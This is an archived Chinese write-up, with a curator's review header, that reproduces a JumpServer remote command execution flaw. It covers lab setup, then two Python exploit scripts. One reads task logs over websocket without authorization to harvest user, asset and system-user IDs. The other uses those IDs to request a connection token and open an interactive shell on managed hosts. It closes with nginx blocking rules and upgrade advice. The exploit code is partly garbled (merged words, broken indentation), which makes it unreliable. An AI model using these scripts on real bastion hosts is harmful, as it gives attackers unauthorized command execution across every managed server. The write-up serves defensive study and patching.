---
source: "MrWQ/vulnerability-paper"
id: "vw-717a16980ba24ec48368781d"
entity_id: "ve-717a16980ba24ec48368781d"
schema_version: "1"
title: "开源堡垒机 JumpServer 远程命令执行漏洞复现"
product: "JumpServer及Koko资产会话"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "2.6<2.6.2/2.5<2.5.4/2.4<2.4.5及1.5.9声称，测试2.6.1；需有可连接资产与日志ID"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%BC%80%E6%BA%90%E5%A0%A1%E5%9E%92%E6%9C%BA%20JumpServer/%E5%BC%80%E6%BA%90%E5%A0%A1%E5%9E%92%E6%9C%BA%20JumpServer%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/1K4qMViaMShvv-Nh-XKoYw"
source_status: "recorded"
---

# 开源堡垒机 JumpServer 远程命令执行漏洞复现

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：JumpServer及Koko资产会话
- 本文讨论：未授权日志读取+连接token越权
- 版本、权限与配置前提：2.6&lt;2.6.2/2.5&lt;2.5.4/2.4&lt;2.4.5及1.5.9声称，测试2.6.1；需有可连接资产与日志ID
- 资料类型：JumpServer历史漏洞搭建及链复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 各分支上界不能当三个嵌套全版本区间，需明确分支和1.5.9补丁情况
- Python多处awaitclient/returnFalse/withwebsockets粘连、缩进破损；nginx proxy_passhttp和wgethttps也损坏
- 安装器2.6.2/应用2.6.1分层应明示；资产root是实验配置不自动所有环境root
- 临时只封token接口仍未解决日志泄露，location顺序不是一般前缀匹配的唯一依据

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 官方版本/编号、配置缓解覆盖和截图待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1K4qMViaMShvv-Nh-XKoYw)

**上方蓝色字体关注我们，一起学安全！**

**作者：daxi0ng**

**本文字数：1946**

**阅读时长：6～7min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

JumpServer 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维审计系统。JumpServer 使用 Python / Django 进行开发。

**0x02 漏洞概述**  

  

2021 年 1 月 15 日，JumpServer 发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关 API 操作控制其中所有机器，执行任意命令。

**0x03 影响版本**  

  

JumpServer < v2.6.2

JumpServer < v2.5.4

JumpServer < v2.4.5

JumpServer = v1.5.9

**0x04 环境搭建**  

  

**JumpServer v2.6.1**  

1、安装脚本

```
https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip
```

注意是 Centos 7 系统  

内存 8G 以上，cpu2 核以上  

或者执行官网脚本

```
curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh| bash
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicSvZicibV55FJFFoDd75kQriaOhdGAv1XggxAWpPgicu1vyKkLJ6x0ZwWZg/640?wx_fmt=png)

2、配置好之后，解压缩包，运行

```
./quick_start.sh
```

一路回车即可

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicMMQiajy4pxLhCuGyazXqytpkZgLrl9f3BTphjvWdvZuoKaUkW35KCCw/640?wx_fmt=png)

3、进入目录下执行：

```
cd /opt/jumpserver-installer-v2.6.2
./jmsctl.sh start
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicKDniaMTaOmxl2fDrMdDblcNPWbia9zVR7IicRmyoXbwIGdUia6ZTnuW7RA/640?wx_fmt=png)

4、如果发现安装的版本不是 v2.6.1，执行

```
./jmsctl.sh upgrade v2.6.1
```

5、访问

```
http://192.168.217.159:8080
```

初始账号密码为 admin/admin

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGiciaZibQSVzicCphGeIHB67bsqYic0ZRW3Tv9I4AjpTllYPUH3jScSibSQsHw/640?wx_fmt=png)

6、更新用户列表里的用户名为 root，后面 ssh 连接时的用户是 root

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGic327O1g63L7ZfAMJbKEusoVxs8qd3KhH3mg2srdg2iaU9n6tpxragFvA/640?wx_fmt=png)

7、创建一个系统用户

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicHgDuo6enMW8kAKWQp6o7x0KcQDiaIHzibeogInKTgeQ4Mkez7fOFB1aw/640?wx_fmt=png)

8、更新管理用户

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGiccjyXO8b8HWpwFic3v9sCVpo69mtmM7tfCbEgPW8h4byOgtkO7T3w8lQ/640?wx_fmt=png)

9、新建一个资产

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicyYpTF4kVE86WTFPEEkKibMfJOy3HBu7PaPl1caia1Crr8LsQokwrR6EA/640?wx_fmt=png)

10、资产授权，否则控制台没有机器

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicdxSBGy5r3gdDAAhjqolosuXDbVnnz5zTo95OJ6vIuOqGfpcvqJhuBQ/640?wx_fmt=png)

11、成功连接机器

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGic0EiaOk07Kr5ica6eSgeDhibqgE2mLfqzdVMa8Hkweoy3jf0dtD2RJljFA/640?wx_fmt=png)  

**0x05 漏洞复现**  

  

1、运行脚本  

获取到 asset,system_user,user 三个 ID 值  

```
import asyncio
import re
 
import websockets
import json
 
url = "/ws/ops/tasks/log/"
 
async def main_logic(t):
   print("#######start ws")
    async withwebsockets.connect(t) as client:
        awaitclient.send(json.dumps({"task":"/opt/jumpserver/logs/gunicorn"}))
        while True:
            ret = json.loads(awaitclient.recv())
           print(ret["message"], end="")
 
if __name__ == "__main__":
    host ="http://192.168.217.159:8080"
    target =host.replace("https://","wss://").replace("http://", "ws://") + url
    print("target:%s" % (target,))
   asyncio.get_event_loop().run_until_complete(main_logic(target))
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicDMBh6UXkl4FFjAibGfC6paQiaJxpqUudd5XMxLtY3DicHtuS5F83qw78Q/640?wx_fmt=png)

2、将 asset，system_user，user 三个 ID 值  

放入下面脚本，运行 Getshell  

```
import os
import asyncio
import aioconsole
import websockets
import requests
import json
 
url = "/api/v1/authentication/connection-token/?user-only=1"
 
 
def get_celery_task_log_path(task_id):
    task_id =str(task_id)
    rel_path =os.path.join(task_id[0], task_id[1], task_id + ".log")
    path =os.path.join("/opt/jumpserver/", rel_path)
    return path
 
 
async def send_msg(websocket, _text):
    if _text =="exit":
        print(f'youhave enter "exit", goodbye')
        awaitwebsocket.close(reason="user exit")
        returnFalse
    awaitwebsocket.send(_text)
 
 
async def send_loop(ws, session_id):
    while True:
        cmdline =await aioconsole.ainput()
        awaitsend_msg(
            ws,
           json.dumps(
               {"id": session_id, "type":"TERMINAL_DATA", "data": cmdline + "\n"}
            ),
        )
 
 
async def recv_loop(ws):
    while True:
        recv_text =await ws.recv()
        ret =json.loads(recv_text)
        ifret.get("type", "TERMINAL_DATA"):
            awaitaioconsole.aprint(ret["data"], end="")
```

# 客户端主逻辑  

```
async def main_logic():
   print("#######start ws")
    async withwebsockets.connect(target) as client:
        recv_text =await client.recv()
       print(f"{recv_text}")
        session_id= json.loads(recv_text)["id"]
       print("get ws id:" + session_id)
        print("###############")
       print("init ws")
       print("###############")
        inittext =json.dumps(
            {
               "id": session_id,
               "type": "TERMINAL_INIT",
               "data": '{"cols":164,"rows":17}',
            }
        )
        awaitsend_msg(client, inittext)
        awaitasyncio.gather(recv_loop(client), send_loop(client, session_id))
 
 
if __name__ == "__main__":
    host ="http://192.168.217.159:8080"
    cmd ="whoami"
    if host[-1] =="/":
        host =host[:-1]
    print(host)
    data ={"user": "4e98541f-a9d9-4d4a-8e62-aab3a3dcc503","asset": "d946e264-d139-4bb4-a375-be8c141587a0",
           "system_user":"2683a326-a6f4-41d3-8590-455fd3990202"}
   print("##################")
    print("gettoken url:%s" % (host + url,))
   print("##################")
    res =requests.post(host + url, json=data)
    token =res.json()["token"]
   print("token:%s", (token,))
   print("##################")
    target = (
       "ws://" + host.replace("http://", "") +"/koko/ws/token/?target_id=" + token
    )
   print("target ws:%s" % (target,))
   asyncio.get_event_loop().run_until_complete(main_logic())
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicyRsWrenlic318JrSFyCIxjEkOib4j12DQ9fm9lVzKzG8md42KEfBUibrA/640?wx_fmt=png)

**0x06 修复方式**  

  

官方修复：将 JumpServer 升级至安全版本

```
https://blog.fit2cloud.com/?p=1761
```

临时修复方案:

修改 Nginx 配置文件屏蔽漏洞接口

```
/api/v1/authentication/connection-token/
/api/v1/users/connection-token/
```

Nginx 配置文件位置  

# 社区老版本

```
/etc/nginx/conf.d/jumpserver.conf
```

# 企业老版本

```
jumpserver-release/nginx/http_server.conf
```

# 新版本在

```
jumpserver-release/compose/config_static/http_server.conf
```

修改 Nginx 配置文件实例

# 保证在 /api 之前和 / 之前  

```
location /api/v1/authentication/connection-token/ {
   return 403;
}
 
location /api/v1/users/connection-token/ {
   return 403;
}
```

# 新增以上这些 

```
location /api/ {
   proxy_set_header X-Real-IP $remote_addr;
   proxy_set_header Host $host;
   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_passhttp://core:8080;
  }
 
...
```

修改完成后重启 nginx

docker 方式:

```
docker restart jms_nginx
```

nginx 方式:

```
systemctl restart nginx
```

修复验证

```
$ wgethttps://github.com/jumpserver/jumpserver/releases/download/v2.6.2/jms_bug_check.sh
```

# 使用方法 bashjms_bug_check.sh HOST

```
$ bash jms_bug_check.sh demo.jumpserver.org
```

**0x07 总结**  

  

JumpServer 日志  

在 / opt/jumpserver/core/logs 路径下

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjqpoq0ib9pTPTrx1WTO9XGicmKibDbFJ1Gyw0GlgAaVtDPXeM5hUWXDDzgVKxKFTaedxous7qv2OWPQ/640?wx_fmt=png)

‍websocket 进行日志读取时  
以下路径没有找到 asset，system_user，user 三个 ID  

```
ws://192.168.217.159:8080/ws/ops/tasks/log/
{"task":"/opt/jumpserver/logs/jumpserver"}
```

看了一下发现可以通过 gunicorn 路径获取到  

```
ws://192.168.217.159:8080/ws/ops/tasks/log/
{"task":"/opt/jumpserver/logs/gunicorn"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
